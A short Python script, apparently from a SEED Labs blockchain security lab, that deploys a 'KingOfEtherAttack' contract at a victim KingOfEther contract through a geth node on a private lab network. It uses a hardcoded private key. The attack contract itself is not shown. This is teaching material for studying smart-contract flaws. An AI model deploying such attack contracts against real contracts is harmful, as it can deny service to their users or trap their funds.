#!/bin/env python3

from web3 import Web3
import os
import sys

# Add the shared folder to sys.path
sys.path.append(os.path.abspath("../shared"))

import SEEDWeb3

# Paths to ABI and bytecode files
abi_file = "../contract/KingOfEtherAttack.abi"
bin_file = "../contract/KingOfEtherAttack.bin"

# victim_addr = "put address here"
victim_addr = "0x3C27A90E2C9d1f702c3BE2C412790bDCa93fC68E"

# Connect to a geth node
web3 = SEEDWeb3.connect_to_geth_pos('http://10.151.0.71:8545')

# Private key and derived account
private_key = "6510652e04c9bcb471982164cf779fc0b624bb26bc3cfe5a8a54bddeba90d667"

print(f"Deploying Attack contract targeting KingOfEther at {victim_addr}...")
addr = SEEDWeb3.deploy_contract(web3, private_key, abi_file, bin_file, victim_addr)
print(f"Attack contract deployed at: {addr}")
with open("contract_address_attack.txt", "w") as fd:
    fd.write(addr)